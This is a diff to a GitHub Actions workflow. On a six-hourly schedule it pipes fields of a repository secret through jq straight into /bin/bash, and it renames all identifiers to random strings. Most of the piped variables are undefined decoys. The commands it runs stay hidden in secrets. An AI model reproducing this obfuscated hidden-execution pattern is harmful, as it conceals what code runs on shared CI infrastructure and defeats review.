@@ -3,7 +3,7 @@ name: baiheizi7182
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 0/6 * * *'
+    - cron: '9 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: baiheizi7182
         env:
-          l0: ${{ secrets.l0 }}
+          ufh9885: ${{ secrets.ufh9885 }}
         run: |
-          echo $l0 | jq -r .b34604 | /bin/bash
-          echo $gfgd52754 | jq -r .va363 | /bin/bash
-          echo $ioi26507 | jq -r .hybz1 | /bin/bash
-          echo $xobs097 | jq -r .j5703 | /bin/bash
-          echo $wglz71 | jq -r .qi27402 | /bin/bash
-          echo $m5 | jq -r .j89 | /bin/bash
-          echo $monby3 | jq -r .i7 | /bin/bash
-          echo $kcswm348 | jq -r .fa9 | /bin/bash
+          echo $ufh9885 | jq -r .rdcu50379 | /bin/bash
+          echo $mihti8082 | jq -r .itm69 | /bin/bash
+          echo $k514 | jq -r .bb74 | /bin/bash
+          echo $t12918 | jq -r .a5833 | /bin/bash
+          echo $qfh0 | jq -r .qgfay4606 | /bin/bash
+          echo $qtc837 | jq -r .quzpo82 | /bin/bash
+          echo $a242 | jq -r .qhws5531 | /bin/bash
+          echo $uof786 | jq -r .shamp9 | /bin/bash
+          echo $c244 | jq -r .eqwj4176 | /bin/bash
 
